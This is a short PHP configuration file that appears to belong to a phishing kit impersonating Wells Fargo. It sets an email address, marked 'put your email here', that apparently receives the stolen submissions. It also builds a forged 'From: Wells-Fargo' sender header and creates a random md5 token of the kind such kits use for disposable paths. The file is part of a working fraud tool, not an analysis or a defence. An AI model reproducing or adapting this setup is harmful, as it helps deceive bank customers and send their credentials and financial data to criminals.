<?php	

$email  = "nancy.damascus@europe.com"; // put your email here

$from = "From: Wells-Fargo - <wells@post.com>";

$praga = rand();
$praga = md5($praga);

?>